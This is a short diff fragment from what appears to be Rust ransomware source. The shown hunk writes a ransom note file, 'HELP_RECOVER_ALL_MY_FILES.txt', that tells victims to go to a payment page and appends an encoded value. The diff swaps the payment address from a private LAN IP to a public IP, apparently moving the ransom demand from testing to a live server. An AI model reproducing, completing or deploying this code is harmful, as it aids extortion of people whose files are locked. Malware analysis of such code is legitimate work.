@@ -71,7 +71,7 @@ async fn main() {
                 .open("HELP_RECOVER_ALL_MY_FILES.txt")
                 .unwrap();
             let message =
-                String::from("To recover your files please Go to https://192.168.10.121/userpay/")
+                String::from("To recover your files please Go to https://82.66.179.79/userpay/")
                     + &encoded;
             file.write_all(message.as_bytes()).unwrap();
 
